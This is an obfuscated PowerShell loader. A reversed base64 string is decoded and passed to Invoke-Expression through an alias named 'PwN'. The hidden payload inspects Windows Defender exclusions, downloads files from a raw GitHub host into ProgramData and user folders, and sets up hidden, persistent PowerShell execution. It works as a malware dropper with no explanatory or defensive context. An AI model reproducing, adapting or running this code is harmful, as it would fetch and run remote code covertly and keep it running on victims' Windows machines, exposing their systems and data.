$BeSt64CoDe = "=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" ;
$BaSe64 = $BeSt64CoDe.ToCharArray() ; [array]::Reverse($BaSe64) ; $BaSe64 = -join $BaSe64 ;
$LoAdCoDe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($BaSe64)) ;
$PwN = "In"+"VoKe"+"-"+"ExPrEsSiOn" ; New-Alias -Name PwN -Value $PwN -Force ; PwN $LoAdCoDe ;
